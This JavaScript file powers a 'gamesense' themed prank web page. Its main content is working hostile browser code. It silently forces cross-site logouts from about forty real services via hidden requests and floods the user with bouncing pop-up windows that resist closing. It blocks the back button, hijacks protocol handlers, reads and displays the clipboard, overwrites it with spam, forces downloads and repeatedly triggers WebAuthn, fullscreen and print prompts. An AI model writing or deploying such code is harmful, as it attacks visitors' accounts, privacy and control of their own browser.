/*
  gamesense.pl
  special thanks to jaczup for publishing src to github
*/

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

const SEARCHES = [
  'gamesense.pub',
  'how to get skeet invite',
  'gamesense invite generator',
  'skeet.cc invite 2026',
  'no skeet no talk',
  'gamesense config download'
]

const IMAGES = [
  'media/images/10278.gif',
  'media/images/67.jpg',
  'media/images/a84ca3aad1c1f0329f0920505f6c4e33.jpg',
  'media/images/burger.gif',
  'media/images/caption.gif',
  'media/images/fuhneverlose.gif',
  'media/images/giphy.gif',
  'media/images/godmodeaa.gif',
  'media/images/images (2).jfif',
  'media/images/lekcjabiologi.gif',
  'media/images/noskeetnotalk.gif'
]

const VIDEOS = [
  'media/videos/configi.mp4',
  'media/videos/grubykot.mp4',
  'media/videos/zezowaty.mov'
]

const FLOATING_MEDIA = [
  'media/videos/grubykot.mp4',
  'media/videos/zezowaty.mov',
  ...IMAGES
]

const FILE_DOWNLOADS = [
  ...IMAGES,
  ...VIDEOS
]

const PHRASES = [
  'Your gamesense invite has been sent to your email.',
  'Welcome to gamesense dot pub.',
  'Generating your skeet invite code now.',
  'Missed due to spread.',
  'Your Brazzers subscription has been activated.'
]

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', { provider: null, voip_provider: null }],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
  OLX: ['GET', 'https://www.olx.pl/account/logout'],
  Roblox: ['POST', 'https://auth.roblox.com/v2/logout'],
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
  Guilded: ['POST', 'https://www.guilded.gg/api/logout'],
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
  Reddit: ['GET', 'https://www.reddit.com/logout'],
  Spotify: ['GET', 'https://www.spotify.com/logout/'],
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
  Trello: ['GET', 'https://trello.com/logout'],
  Baidu: ['GET', 'https://passport.baidu.com/?logout'],
  VK: ['GET', 'https://vk.com/exit'],
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'],
  Asana: ['POST', 'https://app.asana.com/app/asana/-/logout']
}

const wins = []
let interactionCount = 0
const veryLongString = 'no skeet no talk gamesense.pub 1 tap!!1 '.repeat(50000)

let numSuperLogoutIframes = 0

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

const isParentWindow = !isChildWindow

if (isChildWindow) {
  init()
  initChildWindow()
} else {
  window.triggerPrank = function () {
    const menu = document.getElementById('menuWindow')
    if (menu) menu.style.display = 'none'
    document.body.style.display = 'block'
    document.body.style.margin = '0'
    document.body.style.padding = '0'

    startBackgroundVideo('media/videos/configi.mp4')

    FLOATING_MEDIA.forEach((mediaSrc, i) => {
      setTimeout(() => {
        try { spawnFloatingMedia(mediaSrc) } catch (e) { }
      }, i * 80)
    })

    VIDEOS.forEach((vidSrc, i) => {
      setTimeout(() => {
        try { openWindow(vidSrc) } catch (e) { }
      }, i * 150)
    })

    setTimeout(() => {
      try { openSearchWindow(SEARCHES[0]) } catch (e) { }
    }, 120)

    IMAGES.forEach((imgSrc, i) => {
      setTimeout(() => {
        try { openWindow(imgSrc) } catch (e) { }
      }, 350 + (i * 120))
    })

    SEARCHES.slice(1).forEach((q, i) => {
      setTimeout(() => {
        try { openSearchWindow(q) } catch (e) { }
      }, 500 + (i * 250))
    })

    try { speak('Your gamesense invite has been sent to your email.') } catch (e) { }

    try { superLogout() } catch (e) { }

    try { startTheramin() } catch (e) { }
    try { triggerFileDownload() } catch (e) { }
    try { startVibrateInterval() } catch (e) { }
    try { copySpamToClipboard() } catch (e) { }
    try { startAlertInterval() } catch (e) { }
    try { requestFullscreen() } catch (e) { }
    try { requestPointerLock() } catch (e) { }

    try { confirmPageUnload() } catch (e) { }
    try { blockBackButton() } catch (e) { }
    try { fillHistory() } catch (e) { }
    try { registerProtocolHandlers() } catch (e) { }
    try { rainbowThemeColor() } catch (e) { }
    try { animateUrlWithEmojis() } catch (e) { }

    try { startAggressiveInterception() } catch (e) { }
  }
}

let mediaCycleIndex = 0
function startAggressiveInterception() {
  interceptUserInput(event => {
    interactionCount += 1

    try {
      event.preventDefault()
      event.stopPropagation()
    } catch (e) { }

    if (event.which !== 0) {
      const nextMedia = FLOATING_MEDIA[mediaCycleIndex % FLOATING_MEDIA.length]
      mediaCycleIndex++
      try { openWindow(nextMedia) } catch (e) { }
      try { spawnFloatingMedia(nextMedia) } catch (e) { }

      if (Math.random() < 0.35) {
        try { openSearchWindow() } catch (e) { }
      }
    }

    try { startVibrateInterval() } catch (e) { }
    try { enablePictureInPicture() } catch (e) { }
    try { triggerFileDownload() } catch (e) { }
    try { focusWindows() } catch (e) { }
    try { copySpamToClipboard() } catch (e) { }
    try { speak() } catch (e) { }
    try { startTheramin() } catch (e) { }

    if (event.key === 'Meta' || event.key === 'Control') {
      try { window.print() } catch (e) { }
      try { requestWebauthnAttestation() } catch (e) { }
    } else {
      try { requestPointerLock() } catch (e) { }
      if (!window.ApplePaySession) {
        try { requestWebauthnAttestation() } catch (e) { }
      }
      try { requestClipboardRead() } catch (e) { }
      try { requestFullscreen() } catch (e) { }
    }
  })
}

function init() {
  confirmPageUnload()
}

function initChildWindow() {
  const menu = document.getElementById('menuWindow')
  if (menu) menu.style.display = 'none'
  document.body.style.display = 'block'
  document.body.style.background = '#000000'
  document.body.style.overflow = 'hidden'

  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  startMedia()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()
  startAggressiveInterception()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

function initParentWindow() {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()
}

function attemptToTakeoverReferrerWindow() {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

function isParentSameOrigin() {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function confirmPageUnload() {
  window.addEventListener('beforeunload', event => {
    speak('Your gamesense invite has been sent to your email.')
    event.returnValue = true
  })
}

function registerProtocolHandlers() {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin',
    'geo',
    'im',
    'irc',
    'ircs',
    'magnet',
    'mailto',
    'mms',
    'news',
    'ircs',
    'nntp',
    'sip',
    'sms',
    'smsto',
    'ssh',
    'tel',
    'urn',
    'webcal',
    'wtai',
    'xmpp'
  ]

  const handlerUrl = window.location.href + '/url=%s'

  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'GameSense')
  })
}

function requestCameraAndMic() {
  if (!navigator.mediaDevices ||
    typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { })
    }, () => { })
  })
}

function animateUrlWithEmojis() {
  if (window.ApplePaySession) {
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies() {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave() {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons() {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

function requestPointerLock() {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

function startVibrateInterval() {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

function interceptUserInput(onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

function startInvisiblePictureInPictureVideo() {
  let video = document.getElementById('pipVideo')
  if (!video) {
    video = document.createElement('video')
    video.id = 'pipVideo'
    video.src = 'media/videos/configi.mp4'
    video.loop = true
    video.muted = true
    video.style.cssText = HIDDEN_STYLE
    video.autoplay = true
    video.play().catch(() => { })

    document.body.appendChild(video)
  }
}

function enablePictureInPicture() {
  const pipVideo = document.getElementById('pipVideo')
  if (pipVideo && document.pictureInPictureEnabled) {
    pipVideo.muted = false
    pipVideo.requestPictureInPicture().catch(() => { })
    pipVideo.play().catch(() => { })
  }
}

function focusWindows() {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

function openWindow(mediaSrc) {
  try {
    const { x, y } = getRandomCoords()
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
    let targetUrl = window.location.href.split('?')[0].split('#')[0] + '?child=true'
    if (mediaSrc) {
      targetUrl += '&media=' + encodeURIComponent(mediaSrc)
    }
    const win = window.open(targetUrl, '_blank', opts)

    if (!win) return null
    wins.push(win)

    if (wins.length === 2) {
      setupSearchWindow(win)
    }

    try {
      win.onunload = function () {
        return false;
      };

      win.addEventListener("beforeunload", function (e) {
        e.preventDefault();
        e.returnValue = "";
      });

      win.onbeforeunload = function () {
        return "";
      };
    } catch (e) { }
    return win
  } catch (err) {
    console.warn('openWindow error:', err)
    return null
  }
}

function openSearchWindow(query) {
  try {
    const q = query || getRandomArrayEntry(SEARCHES)
    const { x, y } = getRandomCoords()
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
    const searchUrl = 'https://www.google.com/search?q=' + encodeURIComponent(q)
    const win = window.open(searchUrl, '_blank', opts)
    if (win) wins.push(win)
    return win
  } catch (err) {
    console.warn('openSearchWindow error:', err)
    return null
  }
}

function spawnFloatingMedia(src) {
  try {
    const mediaSrc = src || getRandomArrayEntry(FLOATING_MEDIA)
    const isVideo = mediaSrc.endsWith('.mp4') || mediaSrc.endsWith('.mov')

    const el = document.createElement(isVideo ? 'video' : 'img')
    el.src = mediaSrc
    if (isVideo) {
      el.autoplay = true
      el.loop = true
      el.playsInline = true
      el.muted = false
      el.play().catch(() => {
        el.muted = true
        el.play().catch(() => { })
      })
    }

    const randWidth = Math.floor(Math.random() * 330 + 320)
    const randHeight = Math.floor(Math.random() * 240 + 240)

    el.style.cssText = `
      position: fixed;
      width: ${randWidth}px;
      max-width: 85vw;
      height: auto;
      max-height: ${randHeight}px;
      object-fit: contain;
      z-index: 1000;
      pointer-events: none;
      user-select: none;
      filter: drop-shadow(0 8px 24px rgba(0, 0, 0, 0.9));
      border-radius: 0 !important;
    `
    document.body.appendChild(el)

    let w = randWidth
    let h = randHeight
    if (isVideo) {
      el.onloadedmetadata = () => {
        w = el.offsetWidth || randWidth
        h = el.offsetHeight || randHeight
      }
    } else {
      el.onload = () => {
        w = el.offsetWidth || randWidth
        h = el.offsetHeight || randHeight
      }
    }

    let posX = Math.max(10, Math.floor(Math.random() * Math.max(50, window.innerWidth - randWidth - 30)))
    let posY = Math.max(10, Math.floor(Math.random() * Math.max(50, window.innerHeight - randHeight - 30)))
    let speedX = (Math.random() > 0.5 ? 1 : -1) * (5 + Math.random() * 8)
    let speedY = (Math.random() > 0.5 ? 1 : -1) * (5 + Math.random() * 8)

    el.style.left = posX + 'px'
    el.style.top = posY + 'px'

    setInterval(() => {
      posX += speedX
      posY += speedY

      const currentW = el.offsetWidth || w
      const currentH = el.offsetHeight || h

      if (posX <= 0) { posX = 0; speedX = Math.abs(speedX) }
      if (posX + currentW >= window.innerWidth) { posX = Math.max(0, window.innerWidth - currentW); speedX = -Math.abs(speedX) }
      if (posY <= 0) { posY = 0; speedY = Math.abs(speedY) }
      if (posY + currentH >= window.innerHeight) { posY = Math.max(0, window.innerHeight - currentH); speedY = -Math.abs(speedY) }

      el.style.left = posX + 'px'
      el.style.top = posY + 'px'
    }, 30)

    return el
  } catch (err) {
    console.warn('spawnFloatingMedia error:', err)
  }
}
const spawnFloatingWindow = spawnFloatingMedia

function hideCursor() {
  document.querySelector('html').style = 'cursor: none;'
}

function triggerFileDownload() {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}

function speak(phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

function startTheramin() {
  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)

  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 3
  }

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

function requestClipboardRead() {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          window.alert("Successfully read data from clipboard: '" + data + "'")
        }
      },
      () => { }
    )
  } catch { }
}

function requestWebauthnAttestation() {
  try {
    const createCredentialDefaultArgs = {
      publicKey: {
        rp: {
          name: 'GameSense'
        },
        user: {
          id: new Uint8Array(16),
          name: 'invite@gamesense.pub',
          displayName: 'GameSense VIP'
        },
        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],
        attestation: 'direct',
        timeout: 60000,
        challenge: new Uint8Array([
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        challenge: new Uint8Array([
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch { }
}

function requestMidiAccess() {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch { }
}

function requestBluetoothAccess() {
  try {
    navigator.bluetooth.requestDevice({
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch { }
}

function requestUsbAccess() {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch { }
}

function requestSerialAccess() {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch { }
}

function requestHidAccess() {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch { }
}

function moveWindowBounce() {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

let videoPlayCount = 0

function startBackgroundVideo(videoSrc) {
  videoSrc = videoSrc || 'media/videos/configi.mp4'
  let bgVideo = document.getElementById('bgVideo')
  if (!bgVideo) {
    bgVideo = document.createElement('video')
    bgVideo.id = 'bgVideo'
    bgVideo.className = 'bg-video'
    document.body.appendChild(bgVideo)
  }
  bgVideo.src = videoSrc
  bgVideo.autoplay = true
  bgVideo.loop = true
  bgVideo.playsInline = true
  bgVideo.muted = false
  bgVideo.style.cssText = 'position: fixed !important; top: 0 !important; left: 0 !important; right: 0 !important; bottom: 0 !important; width: 100vw !important; height: 100vh !important; min-width: 100vw !important; min-height: 100vh !important; max-width: none !important; max-height: none !important; object-fit: fill !important; z-index: 1 !important; pointer-events: none !important; margin: 0 !important; padding: 0 !important; border: none !important;'

  bgVideo.play().catch(() => {
    bgVideo.muted = true
    bgVideo.play().catch(() => { })
  })

  const tryUnmute = () => {
    if (bgVideo.muted) {
      bgVideo.muted = false
      bgVideo.play().catch(() => { })
    }
  }
  document.body.addEventListener('click', tryUnmute, { once: true })
  document.body.addEventListener('keydown', tryUnmute, { once: true })
}

function startVideo(videoSrc) {
  if (!videoSrc) {
    if (videoPlayCount === 0) {
      videoSrc = 'media/videos/configi.mp4'
    } else {
      videoSrc = getRandomArrayEntry(VIDEOS)
    }
  }
  videoPlayCount++
  startBackgroundVideo(videoSrc)
}

function startImage(imgSrc) {
  const img = document.createElement('img')
  img.src = imgSrc || getRandomArrayEntry(IMAGES)
  img.style = 'width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; z-index: 1; object-fit: fill; background: #000000;'
  document.body.appendChild(img)
}

function startMedia() {
  try {
    const urlParams = new URLSearchParams(window.location.search)
    const specifiedMedia = urlParams.get('media')

    if (specifiedMedia) {
      if (specifiedMedia.endsWith('.mp4') || specifiedMedia.endsWith('.mov') || VIDEOS.includes(specifiedMedia)) {
        startVideo(specifiedMedia)
      } else {
        startImage(specifiedMedia)
      }
      return
    }
  } catch (e) { }

  if (videoPlayCount === 0) {
    startVideo('media/videos/configi.mp4')
    return
  }

  if (Math.random() < 0.5 && IMAGES.length > 0) {
    startImage()
  } else {
    startVideo()
  }
}

function detectWindowClose() {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

function onCloseWindow(win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

function showHelloMessage() {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

function removeHelloMessage() {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
}

function rainbowThemeColor() {
  function zeroFill(width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}

function copySpamToClipboard() {
  clipboardCopy(veryLongString)
}

function clipboardCopy(text) {
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre'

  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

function startAlertInterval() {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 30000)
}

function showAlert() {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

function requestFullscreen() {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

function superLogout() {
  function cleanup(el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get(url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post(url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }

  let logoutMessages = document.querySelector('.logout-messages')
  if (!logoutMessages || logoutMessages.closest('#menuWindow')) {
    if (logoutMessages && logoutMessages.parentNode) {
      logoutMessages.parentNode.removeChild(logoutMessages)
    }
    logoutMessages = document.createElement('div')
    logoutMessages.className = 'logout-messages'
    document.body.appendChild(logoutMessages)
  }
  logoutMessages.style.display = 'block'

  const siteEntries = Object.entries(LOGOUT_SITES)
  siteEntries.forEach(([name, config], index) => {
    setTimeout(() => {
      const method = config[0]
      const url = config[1]
      const params = config[2] || {}

      if (method === 'GET') {
        get(url)
      } else {
        post(url, params)
      }

      const div = document.createElement('div')
      div.innerText = `Logging out of ${name}...`
      logoutMessages.appendChild(div)
    }, index * 80)
  })
}

function blockBackButton() {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory() {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
}

function getRandomCoords() {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

function getRandomArrayEntry(arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function setupSearchWindow(win) {
  if (!win) return
  let searchIndex = 0
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      try { win.location.href = window.location.pathname } catch (e) { }
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    try {
      const { x, y } = getRandomCoords()
      try { win.moveTo(x, y) } catch (e) { }
      win.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    } catch (e) {
      clearInterval(interval)
    }
  }, 2500)
}
